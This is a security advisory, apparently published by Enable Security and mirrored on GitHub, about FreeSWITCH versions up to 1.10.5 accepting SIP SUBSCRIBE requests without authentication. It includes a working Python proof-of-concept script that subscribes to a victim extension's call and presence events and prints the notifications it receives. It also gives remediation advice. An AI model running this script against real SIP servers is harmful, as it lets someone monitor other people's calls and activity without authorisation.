    - Enable Security advisory: 2021-10-25

## Description

By default, SIP requests of the type SUBSCRIBE are not authenticated in the affected versions of FreeSWITCH. Although
this issue was [fixed][1] in version v1.10.6, installations upgraded to the fixed version of FreeSWITCH from an older
version, may still be vulnerable if the configuration is not updated accordingly. For good reason, by default, software
upgrades do not update the configuration.

[1]: <https://github.com/signalwire/freeswitch/commit/b21dd4e7f3a6f1d5f7be3ea500a319a5bc11db9e>

## Impact

Abuse of this security issue allows attackers to subscribe to user agent event notifications without the need to
authenticate. This abuse poses privacy concerns and might lead to social engineering or similar attacks. For example,
attackers may be able to monitor the status of target SIP extensions.

## How to reproduce the issue

1. Install FreeSWITCH v1.10.5 or lower
2. Run FreeSWITCH using the default configuration
3. Register as a legitimate SIP user on the FreeSWITCH server using a softphone (e.g. sip:1000@192.168.188.128 where
192.168.188.128 is your FreeSWITCH server)
4. Save the below Python script to `anon-subscribe.py`
5. Run the script from an IP address that is different from that of the softphone `python anon-subscribe.py
<freeswitch_ip> <freeswitch_port> <victim_extension>`
6. Perform some operations using the softphone, such as deregistering, registering, and placing a call
7. Observe that several notifications are received by the script, exposing the actions being performed by the victim

```python
import socket, string, random, re, sys

UDP_IP = sys.argv[1]
UDP_PORT = int(sys.argv[2])
EXT = sys.argv[3]
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

msg_template = "SUBSCRIBE sip:%s@%s;transport=UDP SIP/2.0\r\n" % (EXT, UDP_IP) + \
    "Via: SIP/2.0/UDP [ip]:[port];rport;branch=z9hG4bK-[rand]\r\n" \
    "Max-Forwards: 70\r\n" \
    "Contact: <sip:%s@[ip]:[port];transport=udp>\r\n" % (EXT, ) + \
    "To: <sip:%s@%s;transport=UDP>\r\n" % (EXT, UDP_IP) + \
    "From: <sip:9999@%s;transport=UDP>;tag=[rand]\r\n" % (UDP_IP, ) + \
    "Call-ID: [rand]\r\n" \
    "CSeq: 1 SUBSCRIBE\r\n" \
    "Expires: 600\r\n" \
    "Accept: */*\r\n" \
    "Event: [event]\r\n" \
    "Content-Length: 0\r\n" \
    "\r\n"

rand = ''.join(random.choice(string.ascii_letters) for i in range(16))
msg = msg_template.replace('[ip]', '127.0.0.1') \
    .replace('[port]', '9999') \
        .replace('[event]', 'dialog') \
            .replace('[rand]', rand)

sock.sendto(msg.encode(), (UDP_IP, UDP_PORT))

recv=sock.recv(10240).decode()

# get rport and received from Via header
rport=re.search( r'rport=([0-9]+)', recv, re.MULTILINE).group(1)
received=re.search( r'received=([0-9\.]+)', recv, re.MULTILINE).group(1)

events = [
    'talk', 'hold', 'conference', 'presence', 'as-feature-event', 'dialog', 'line-seize',
    'call-info', 'sla', 'include-session-description', 'presence.winfo', 'message-summary',
    'refer']

for event in events:
    rand = ''.join(random.choice(string.ascii_letters) for i in range(16))
    msg = msg_template.replace('[ip]', received) \
        .replace('[port]', rport) \
            .replace('[event]', event) \
                .replace('[rand]', rand)
    sock.sendto(msg.encode(), (UDP_IP, UDP_PORT))

while True:
    print(sock.recv(10240).decode().split('\r\n\r\n')[1])
```

## Solution and recommendations

Upgrade to a version of FreeSWITCH that fixes this issue.

Our suggestion to the FreeSWITCH developers was the following:

```
> ```
> Our recommendation is that SIP SUBSCRIBE messages are authenticated by default so that FreeSWITCH administrators do
> not need to explicitly set the `auth-subscriptions` parameter. When following such a recommendation, a new parameter
> can be introduced to explicitly disable authentication.
>
> ```

```

# FreeSWITCH does not authenticate SIP SUBSCRIBE requests by default

Moderate

[andywolk](/andywolk)
published
GHSA-g7xg-7c54-rmpj
Oct 25, 2021

## Package

FreeSWITCH
(C)

## Affected versions

<= 1.10.5

## Patched versions

1.10.7

## Description

## Description

By default, SIP requests of the type SUBSCRIBE are not authenticated in the affected versions of FreeSWITCH.

## Impact

Abuse of this security issue allows attackers to subscribe to user agent event notifications without the need to authenticate. This abuse poses privacy concerns and might lead to social engineering or similar attacks. For example, attackers may be able to monitor the status of target SIP extensions.

## How to reproduce the issue

1. Install FreeSWITCH v1.10.5 or lower
2. Run FreeSWITCH using the default configuration
3. Register as a legitimate SIP user on the FreeSWITCH server using a softphone (e.g. sip:1000@192.168.188.128 where 192.168.188.128 is your FreeSWITCH server)
4. Save the below Python script to `anon-subscribe.py`
5. Run the script from an IP address that is different from that of the softphone `python anon-subscribe.py <freeswitch_ip> <freeswitch_port> <victim_extension>`
6. Perform some operations using the softphone, such as deregistering, registering, and placing a call
7. Observe that several notifications are received by the script, exposing the actions being performed by the victim

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
